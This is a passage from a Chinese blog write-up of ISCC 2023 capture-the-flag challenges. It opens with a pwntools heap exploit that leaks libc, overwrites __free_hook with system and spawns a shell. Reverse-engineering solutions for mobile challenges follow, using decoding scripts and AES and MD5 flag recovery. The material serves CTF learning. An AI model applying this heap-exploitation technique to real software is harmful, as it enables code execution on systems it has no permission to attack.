   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;(by rename T_T)\n&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;name:&quot;</span>,b)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit2</span>(<span class="hljs-params">a,b</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;(by rename T_T)\n&quot;</span>,<span class="hljs-string">b&quot;0&quot;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;sex:&quot;</span>,<span class="hljs-built_in">str</span>(b))

   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">a</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">a</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))

add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;&#x27;</span>)
delete(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
leak_addr=u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
main_arena=leak_addr-<span class="hljs-number">88</span>
malloc_hook=main_arena-<span class="hljs-number">0x10</span>
libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
heap_addr=<span class="hljs-number">0x000404050</span>
payload=p64(<span class="hljs-number">0</span>)
payload+=p64(<span class="hljs-number">0x2c1</span>)
payload+=p64(heap_addr-<span class="hljs-number">0x18</span>)
payload+=p64(heap_addr-<span class="hljs-number">0x10</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0xd8</span>,payload)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
delete(<span class="hljs-number">3</span>)
edit2(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)
delete(<span class="hljs-number">4</span>)
payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>
payload+=p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])
edit1(<span class="hljs-number">2</span>,payload)
edit1(<span class="hljs-number">2</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
delete(<span class="hljs-number">5</span>)
p.interactive()</code></pre>
<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="NOJAVA"><a href="#NOJAVA" class="headerlink" title="NOJAVA"></a>NOJAVA</h2><p>用Jeb打开附件，查找MainActivy函数<br><img src="https://img-blog.csdnimg.cn/2180ccada84e4ce9a8c4ba472c688f05.png" alt="在这里插入图片描述"><br>脚本如下：</p>
<pre><code class="hljs bash">text=<span class="hljs-string">&#x27;iZeejfYefjYZeeYijYjfjijj&#x27;</span>
binary = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(format(ord(i), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text)
a = [binary[i:i+4] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(binary), 4)]
<span class="hljs-comment"># print(a)</span>
payload=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
<span class="hljs-keyword">if</span> i==<span class="hljs-string">&quot;1001&quot;</span>:
 payload+=<span class="hljs-string">&quot;10&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;0110&quot;</span>:
 payload+=<span class="hljs-string">&quot;01&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;1010&quot;</span>:
 payload+=<span class="hljs-string">&quot;11&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;0101&quot;</span>:
 payload+=<span class="hljs-string">&quot;00&quot;</span>
<span class="hljs-keyword">else</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;waaa&quot;</span>)
result = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(chr(int(payload[i:i+8], 2)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(payload), 8))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ISCC&#123;&#x27;</span>+result+<span class="hljs-string">&#x27;&#125;&#x27;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="WhereisHint"><a href="#WhereisHint" class="headerlink" title="WhereisHint"></a>WhereisHint</h2><p>sBox.txt 文件内容如下：<br>0E000000040000000D00000001000000020000000F0000000B000000080000000300000<br>00A000000060000000C00000005000000090000000000000007000000000000000F0000<br>0007000000040000000E000000020000000D000000010000000A000000060000000C000<br>0000B0000000900000005000000030000000800000004000000010000000E0000000800<br>00000D00000006000000020000000B0000000F0000000C0000000900000007000000030<br>000000A00000005000000000000000F0000000C00000008000000020000000400000009<br>0000000100000007000000050000000B000000030000000E0000000A000000000000000<br>60000000D0000000F00000001000000080000000E000000060000000B00000003000000<br>040000000900000007000000020000000D0000000C00000000000000050000000A00000<br>0030000000D00000004000000070000000F00000002000000080000000E0000000C0000<br>0000000000010000000A00000006000000090000000B00000005000000000000000E000<br>000070000000B0000000A000000040000000D0000000100000005000000080000000C00<br>0000060000000900000003000000020000000F0000000D000000080000000A000000010<br>00000030000000F00000004000000020000000B00000006000000070000000C00000000<br>000000050000000E000000090000000A00000000000000090000000E000000060000000<br>30000000F00000005000000010000000D0000000C000000070000000B00000004000000<br>02000000080000000D00000007000000000000000900000003000000040000000600000<br>00A0000000200000008000000050000000E0000000C0000000B0000000F000000010000<br>000D000000060000000400000009000000080000000F00000003000000000000000B000<br>00001000000020000000C000000050000000A0000000E00000007000000010000000A00<br>00000D0000000000000006000000090000000800000007000000040000000F0000000E0<br>00000030000000B00000005000000020000000C000000070000000D0000000E00000003<br>0000000000000006000000090000000A000000010000000200000008000000050000000<br>B0000000C000000040000000F0000000D000000080000000B0000000500000006000000<br>0F00000000000000030000000400000007000000020000000C000000010000000A00000<br>00E000000090000000A0000000600000009000000000000000C0000000B000000070000<br>000D0000000F00000001000000030000000E00000005000000020000000800000004000<br>000030000000F00000000000000060000000A000000010000000D000000080000000900<br>000004000000050000000B0000000C00000007000000020000000E000000020000000C0<br>000000400000001000000070000000A0000000B00000006000000080000000500000003<br>0000000F0000000D000000000000000E000000090000000E0000000B000000020000000<br>C00000004000000070000000D0000000100000005000000000000000F0000000A000000<br>030000000900000008000000060000000400000002000000010000000B0000000A00000<br>00D00000007000000080000000F000000090000000C0000000500000006000000030000<br>00000000000E0000000B000000080000000C00000007000000010000000E00000002000<br>0000D000000060000000F00000000000000090000000A00000004000000050000000300<br>00000C000000010000000A0000000F00000009000000020000000600000008000000000<br>000000D00000003000000040000000E00000007000000050000000B0000000A0000000F<br>0000000400000002000000070000000C000000090000000500000006000000010000000<br>D0000000E000000000000000B0000000300000008000000090000000E0000000F000000<br>0500000002000000080000000C000000030000000700000000000000040000000A00000<br>0010000000D0000000B000000060000000400000003000000020000000C000000090000<br>00050000000F0000000A0000000B0000000E00000001000000070000000600000000000<br>000080000000D000000040000000B000000020000000E0000000F000000000000000800<br>00000D000000030000000C0000000900000007000000050000000A00000006000000010<br>000000D000000000000000B000000070000000400000009000000010000000A0000000E<br>00000003000000050000000C000000020000000F0000000800000006000000010000000<br>40000000B0000000D0000000C00000003000000070000000E0000000A0000000F000000<br>060000000800000000000000050000000900000002000000060000000B0000000D00000<br>00800000001000000040000000A000000070000000900000005000000000000000F0000<br>000E00000002000000030000000C0000000D00000002000000080000000400000006000<br>0000F0000000B000000010000000A00000009000000030000000E000000050000000000<br>00000C00000007000000010000000F0000000D000000080000000A00000003000000070<br>00000040000000C00000005000000060000000B000000000000000E0000000900000002<br>000000070000000B0000000400000001000000090000000C0000000E000000020000000<br>0000000060000000A0000000D0000000F00000003000000050000000800000002000000<br>010000000E00000007000000040000000A000000080000000D0000000F0000000C00000<br>009000000000000000300000005000000060000000B0000001000000007000000140000<br>00150000001D0000000C0000001C00000011000000010000000F000000170000001A000<br>00005000000120000001F0000000A0000000200000008000000180000000E0000002000<br>00001B0000000300000009000000130000000D0000001E00000006000000160000000B0<br>000000400000019000000<br>用jeb打开附件，分析函数，在其中找到了二进制数据，写python脚本并利用软件爆出flag<br><img src="https://img-blog.csdnimg.cn/006fe45d2dba4861b8dab22200bd3760.png" alt="在这里插入图片描述"></p>
<h2 id="ManyJNI"><a href="#ManyJNI" class="headerlink" title="ManyJNI"></a>ManyJNI</h2><p>用jeb打开附件，查找MainActivy函数<br><img src="https://img-blog.csdnimg.cn/89bca8466d0b40cea664c8249efaea32.png" alt="在这里插入图片描述"><br>解密</p>
<pre><code class="hljs python">dic = &#123;<span class="hljs-string">&quot;1463495029.1088610877&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;1049530879.4255690777&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, 
<span class="hljs-string">&quot;2862766292.2381007417&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>,
 <span class="hljs-string">&quot;3330444070.1174262214&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;2227920669.2827401366&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, 
<span class="hljs-string">&quot;1579951362.2846238576&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;368955456.3265704134&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>,
 <span class="hljs-string">&quot;2696190145.613662970&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;3872134833.1068749546&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;891426205.2766473378&quot;</span>: 
<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;1519023352.105877999&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>,
 <span class="hljs-string">&quot;2477809142.443877620&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;2647754101.2230120467&quot;</span>: <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;3075111042.1323776342&quot;</span>: 
<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;986806734.2777299023&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>,
 <span class="hljs-string">&quot;3896053831.4135235691&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;1184712308.807098365&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;4075828588.429489377&quot;</span>: 
<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;2429787593.619384622&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>,
 <span class="hljs-string">&quot;881206442.1709247634&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;1083538065.1130340170&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;4023341693.1586698450&quot;</span>: 
<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;155280819.3054501475&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>,
 <span class="hljs-string">&quot;99771100.1051999332&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;4232898851.3300692563&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;64956337.4234499210&quot;</span>: 
<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2870232400.3722498303&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>,
 <span class="hljs-string">&quot;2841218066.780431097&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;132800239.3878689771&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;2156232310.2823971181&quot;</span>: 
<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;1808290711.212509551&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>,
 <span class="hljs-string">&quot;696150085.2220172189&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;3713618273.3259647236&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;3121040253.2415880190&quot;</span>: 
<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;2858698525.3991735450&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>,
 <span class="hljs-string">&quot;2547227671.698153515&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;654785657.4006927810&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;3711461495.3008240604&quot;</span>: 
<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;3581263639.1952078211&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>,
 <span class="hljs-string">&quot;3164894139.2581098102&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;3160675335.657981347&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1158103192.2450550443&quot;</span>: 
<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;1236282010.4060431406&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>,
 <span class="hljs-string">&quot;4027068562.440012179&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;351048083.1823512614&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;1462318326.3226159060&quot;</span>: 
<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;2954653653.1618611175&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>,
 <span class="hljs-string">&quot;701073028.312955233&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;666315003.3369729975&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;2853626980.607086523&quot;</span>: 
<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;19734539.2637167118&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>,
 <span class="hljs-string">&quot;4120373985.112157582&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;2302105109.2843567652&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;1392500071.2693188089&quot;</span>: 
<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;709910699.3712210805&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>,
 <span class="hljs-string">&quot;3113384841.1999610280&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;1964704696.30454558&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;3016651642.1304626590&quot;</span>: 
<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;924745076.1085575287&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>,
 <span class="hljs-string">&quot;1979386605.348865528&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;3283987997.1614515444&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;3248176867.998559740&quot;</span>: 
<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;2460099397.287946231&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,
 <span class="hljs-string">&quot;933728663.4036345491&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;870221498.4165280671&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;700813972.3680578651&quot;</span>: 
<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;2666170697.1050538432&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>,
 <span class="hljs-string">&quot;3735675442.4106461569&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;3944223761.1040972928&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;406509623.2197974953&quot;</span>: 
<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;166914849.75133536&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>,
 <span class="hljs-string">&quot;1971216652.4016620168&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;3126027666.2407112104&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;2421050068.877129437&quot;</span>: 
<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;2694837670.239856188&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>,
 <span class="hljs-string">&quot;4259959222.1144992995&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;1986798057.4141497725&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;734889408.680957602&quot;</span>: 
<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;3747360752.949414639&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>,
 <span class="hljs-string">&quot;4099300672.1926520061&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;2965350987.46203785&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;428936951.1911408410&quot;</span>: 
<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;1336447878.2775388247&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>,
 <span class="hljs-string">&quot;4097885373.4018178710&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;1935593237.368431450&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;529156133.278213883&quot;</span>: 
<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;2381012008.4088810995&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,
 <span class="hljs-string">&quot;385403258.710806366&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;4273244629.3478477188&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;1802901715.704799359&quot;</span>: 
<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;930008935.2627182413&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>,
 <span class="hljs-string">&quot;4018804880.2724391126&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;4067852839.2777358486&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, 
<span class="hljs-string">&quot;1615466436.2634553015&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>&#125;
part1 = 
<span class="hljs-string">&quot;.1579951362.1979386605.2696190145.700813972.891426205.2381012008.4232898851.3248176867.19</span>
<span class="hljs-string">734539.1236282010.529156133.4075828588&quot;</span>[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&quot;.&quot;</span>)
part2 = 
<span class="hljs-string">&quot;.2846238576.348865528.613662970.3680578651.2766473378.4088810995.3300692563.998559740.263</span>
<span class="hljs-string">7167118.4060431406.278213883.429489377&quot;</span>[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&quot;.&quot;</span>)
flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(part1, part2):
 flag += dic[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;a&#125;</span>.<span class="hljs-subst">&#123;b&#125;</span>&quot;</span>]
<span class="hljs-keyword">if</span> flag[-<span class="hljs-number">3</span>:] == <span class="hljs-string">&#x27;ANM&#x27;</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ISCC<span class="hljs-subst">&#123;flag[:-<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)
<span class="hljs-keyword">else</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;检查 part1 和 part2 是否正确！&quot;</span>)</code></pre>
<p>执行就可以获取到flag了</p>
<h2 id="ManyMany"><a href="#ManyMany" class="headerlink" title="ManyMany"></a>ManyMany</h2><p>解压附件，改为zip格式，进入lib/arm64-v8a文件夹，用ida打开，搜索stub函数，查找相应字符，利用python脚本爆出flag<br><img src="https://img-blog.csdnimg.cn/b20b57fa905d4fe7a9df2e5e3927ad36.png" alt="在这里插入图片描述"></p>
<h2 id="MobileTest"><a href="#MobileTest" class="headerlink" title="MobileTest"></a>MobileTest</h2><p>用jeb打开分析函数<br><img src="https://img-blog.csdnimg.cn/2f876a00e3b0424eb2d271d886555134.png" alt="在这里插入图片描述"><br>把so文件拖进ida里，在这里下断点动态调试，即可得到key<br><img src="https://img-blog.csdnimg.cn/4e6911b8c9544047ba668e0c6b11d7d4.png" alt="在这里插入图片描述"><br>在jeb里面找到AES的密文，AES解密即可得到flag<br><img src="https://img-blog.csdnimg.cn/0f93238b7ed3495aa6778845b9febe1b.png" alt="在这里插入图片描述"></p>
<h2 id="Whereisflag"><a href="#Whereisflag" class="headerlink" title="Whereisflag"></a>Whereisflag</h2><p>用ida打开附件，根据提示RC4，md5，在ida里面查找到了一段md5密文，去在线网站上解密得到了flag的一部分<br><img src="https://img-blog.csdnimg.cn/8a86e41af72b4f98a07741f32561d730.png" alt="在这里插入图片描述"><br>分析so文件，在此处下断点动态调试，即可获得flag的第二部分<br><img src="https://img-blog.csdnimg.cn/e5fc80ab3f2c4cd09a1f6cb26b1c5285.png" alt="在这里插入图片描述"><br>flag2=128215131d0dd4119e60<br>最终flag为：ISCC[YOU_LIKE_128215131d0dd4119e60]</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">dwb</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hzy2003628.top/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/">https://hzy2003628.top/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hzy2003628.top" target="_blank">simple blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/24/tea%E7%B3%BB%E5%88%97%E7%AE%97%E6%B3%95/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">tea系列算法</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse9/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">刷题记录reverse9</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="C:\Users\D\blog\themes\butterfly\source\img bear.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dwb</div><div class="author-info__description">follow my heart</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A"><span class="toc-number">1.1.</span> <span class="toc-text">羊了个羊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E5%91%A8%E7%9A%84%E5%AF%86%E7%A0%81%E9%94%81"><span class="toc-number">1.2.</span> <span class="toc-text">小周的密码锁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E7%8B%BC%E8%80%81%E7%8B%BC%E5%87%A0%E7%82%B9%E4%BA%86"><span class="toc-number">1.3.</span> <span class="toc-text">老狼老狼几点了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ChatGGG"><span class="toc-number">1.4.</span> <span class="toc-text">ChatGGG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCC%E7%96%AF%E7%8B%82%E8%B4%AD%E7%89%A9%E8%8A%82-1"><span class="toc-number">1.5.</span> <span class="toc-text">ISCC疯狂购物节-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Where-is-your-love"><span class="toc-number">1.6.</span> <span class="toc-text">Where_is_your_love</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E5%A4%A7%E5%8F%B7%E8%AF%B4%E8%AF%9D"><span class="toc-number">1.7.</span> <span class="toc-text">上大号说话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCC%E5%86%85%E9%83%A8%E9%9B%B6%E5%85%83%E8%B4%AD-2"><span class="toc-number">1.8.</span> <span class="toc-text">ISCC内部零元购-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCC%E6%BB%A5%E7%94%A8%E8%81%8C%E6%9D%83-3"><span class="toc-number">1.9.</span> <span class="toc-text">ISCC滥用职权-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%BA%E5%8A%9B%E7%8E%8B"><span class="toc-number">1.10.</span> <span class="toc-text">智力王</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%81%E9%94%AE%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.11.</span> <span class="toc-text">蚁键连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93"><span class="toc-number">1.12.</span> <span class="toc-text">侧信道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%BB%B4%E5%90%BE%E5%B0%94%E6%97%8F%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">2.1.</span> <span class="toc-text">好看的维吾尔族小姐姐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">人生之路</span></a></li><li class="toc-item toc-level-2"><a 